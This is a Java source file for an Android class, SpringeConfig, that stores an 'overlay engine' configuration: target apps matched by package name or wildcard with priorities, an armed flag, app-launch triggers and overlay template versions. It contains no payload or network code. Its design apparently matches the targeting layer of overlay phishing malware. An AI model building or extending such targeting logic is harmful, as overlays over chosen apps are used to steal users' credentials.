package com.fason.app.features.springe;

import android.content.Context;
import android.content.SharedPreferences;
import android.text.TextUtils;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.locks.ReentrantReadWriteLock;

/**
 * Thread-safe configuration store for the Springe overlay engine.
 * Persists targets, trigger config, and engine state via SharedPreferences.
 * All mutations are synchronized via ReentrantReadWriteLock for maximum
 * concurrency without corruption.
 */
public final class SpringeConfig {

    private static final String TAG = "SpringeConfig";
    private static final String PREFS_NAME = "springe_prefs";

    // Preference keys
    private static final String PREF_ARMED = "springe_armed";
    private static final String PREF_ACTIVE = "springe_active";
    private static final String PREF_TARGETS = "springe_targets_json";
    private static final String PREF_TRIGGERS = "springe_triggers_json";
    private static final String PREF_PAUSED = "springe_paused";
    private static final String PREF_TEMPLATE_VERSIONS = "springe_template_versions";

    // In-memory cache for fast reads
    private volatile boolean armed;
    private volatile boolean paused;
    private volatile String activeOverlayType;

    private final ReentrantReadWriteLock lock = new ReentrantReadWriteLock();
    private final SharedPreferences prefs;

    // Cached target list (volatile + copy-on-write for lock-free reads)
    private volatile List<TargetApp> targetCache = Collections.emptyList();

    public static final class TargetApp {
        public final String packageName;
        public final String displayName;
        public final String category;
        public final int priority;
        public final boolean enabled;

        public TargetApp(String packageName, String displayName,
                         String category, int priority, boolean enabled) {
            this.packageName = packageName;
            this.displayName = displayName != null ? displayName : packageName;
            this.category = category != null ? category : "uncategorized";
            this.priority = priority;
            this.enabled = enabled;
        }

        JSONObject toJson() {
            try {
                JSONObject obj = new JSONObject();
                obj.put("packageName", packageName);
                obj.put("displayName", displayName);
                obj.put("category", category);
                obj.put("priority", priority);
                obj.put("enabled", enabled);
                return obj;
            } catch (Exception e) {
                return new JSONObject();
            }
        }

        static TargetApp fromJson(JSONObject obj) {
            return new TargetApp(
                obj.optString("packageName", ""),
                obj.optString("displayName", ""),
                obj.optString("category", "uncategorized"),
                obj.optInt("priority", 0),
                obj.optBoolean("enabled", true)
            );
        }
    }

    // Singleton
    private static volatile SpringeConfig instance;

    public static SpringeConfig getInstance(Context context) {
        if (instance == null) {
            synchronized (SpringeConfig.class) {
                if (instance == null) {
                    instance = new SpringeConfig(context.getApplicationContext());
                }
            }
        }
        return instance;
    }

    private SpringeConfig(Context context) {
        this.prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        this.armed = prefs.getBoolean(PREF_ARMED, false);
        this.paused = prefs.getBoolean(PREF_PAUSED, false);
        this.activeOverlayType = null;
        loadTargetCache();
    }

    /* ─── Armed State ─── */

    public boolean isArmed() { return armed; }

    public void setArmed(boolean armed) {
        this.armed = armed;
        prefs.edit().putBoolean(PREF_ARMED, armed).apply();
        if (!armed) {
            setActiveOverlayType(null);
        }
    }

    public boolean isPaused() { return paused; }

    public void setPaused(boolean paused) {
        this.paused = paused;
        prefs.edit().putBoolean(PREF_PAUSED, paused).apply();
    }

    /* ─── Active Overlay ─── */

    public String getActiveOverlayType() { return activeOverlayType; }

    public void setActiveOverlayType(String overlayType) {
        this.activeOverlayType = overlayType;
    }

    /* ─── Target Management ─── */

    public List<TargetApp> getTargets() { return targetCache; }

    public boolean hasTarget(String packageName) {
        if (packageName == null) return false;
        for (TargetApp t : targetCache) {
            if (t.enabled && packageName.equals(t.packageName)) return true;
        }
        return false;
    }

    /**
     * Returns the highest-priority matching target for the given package.
     * Returns null if no enabled match.
     */
    public TargetApp matchTarget(String packageName) {
        if (packageName == null) return null;
        TargetApp best = null;
        for (TargetApp t : targetCache) {
            if (!t.enabled) continue;
            if (matchWildcard(packageName, t.packageName)) {
                if (best == null || t.priority > best.priority) {
                    best = t;
                }
            }
        }
        return best;
    }

    private static boolean matchWildcard(String realPackage, String pattern) {
        if (pattern.contains("*")) {
            String prefix = pattern.replace("*", "");
            return realPackage.startsWith(prefix);
        }
        return realPackage.equals(pattern);
    }

    public void setTargets(List<TargetApp> targets) {
        lock.writeLock().lock();
        try {
            JSONArray arr = new JSONArray();
            for (TargetApp t : targets) {
                arr.put(t.toJson());
            }
            prefs.edit().putString(PREF_TARGETS, arr.toString()).apply();
            loadTargetCache();
        } catch (Exception e) {
            Log.e(TAG, "Failed to save targets", e);
        } finally {
            lock.writeLock().unlock();
        }
    }

    public void addTarget(TargetApp target) {
        lock.writeLock().lock();
        try {
            List<TargetApp> list = new ArrayList<>(targetCache);
            // Remove existing entry for same package
            list.removeIf(t -> t.packageName.equals(target.packageName));
            list.add(target);
            setTargets(list);
        } finally {
            lock.writeLock().unlock();
        }
    }

    public void removeTarget(String packageName) {
        lock.writeLock().lock();
        try {
            List<TargetApp> list = new ArrayList<>(targetCache);
            list.removeIf(t -> t.packageName.equals(packageName));
            setTargets(list);
        } finally {
            lock.writeLock().unlock();
        }
    }

    public int getTargetCount() { return targetCache.size(); }

    /* ─── Trigger Config ─── */

    public Set<String> getEnabledTriggers() {
        String raw = prefs.getString(PREF_TRIGGERS, null);
        Set<String> triggers = new HashSet<>();
        triggers.add(SpringeProtocol.TRIGGER_APP_LAUNCH); // default
        if (raw != null) {
            try {
                JSONArray arr = new JSONArray(raw);
                for (int i = 0; i < arr.length(); i++) {
                    triggers.add(arr.getString(i));
                }
            } catch (Exception ignored) {}
        }
        return triggers;
    }

    public void setTriggers(Set<String> triggers) {
        JSONArray arr = new JSONArray();
        for (String t : triggers) {
            arr.put(t);
        }
        prefs.edit().putString(PREF_TRIGGERS, arr.toString()).apply();
    }

    /* ─── Template Versions ─── */

    public void setTemplateVersion(String templateId, int version) {
        prefs.edit().putInt(PREF_TEMPLATE_VERSIONS + "_" + templateId, version).apply();
    }

    public int getTemplateVersion(String templateId) {
        return prefs.getInt(PREF_TEMPLATE_VERSIONS + "_" + templateId, 0);
    }

    /* ─── Internal ─── */

    private void loadTargetCache() {
        lock.readLock().lock();
        try {
            String raw = prefs.getString(PREF_TARGETS, null);
            if (TextUtils.isEmpty(raw)) {
                targetCache = Collections.emptyList();
                return;
            }
            JSONArray arr = new JSONArray(raw);
            List<TargetApp> list = new ArrayList<>(arr.length());
            for (int i = 0; i < arr.length(); i++) {
                try {
                    list.add(TargetApp.fromJson(arr.getJSONObject(i)));
                } catch (Exception ignored) {}
            }
            targetCache = Collections.unmodifiableList(list);
        } catch (Exception e) {
            Log.e(TAG, "Failed to load target cache", e);
            targetCache = Collections.emptyList();
        } finally {
            lock.readLock().unlock();
        }
    }

    /** Reset all config to defaults */
    public void reset() {
        prefs.edit().clear().apply();
        armed = false;
        paused = false;
        activeOverlayType = null;
        targetCache = Collections.emptyList();
    }
}
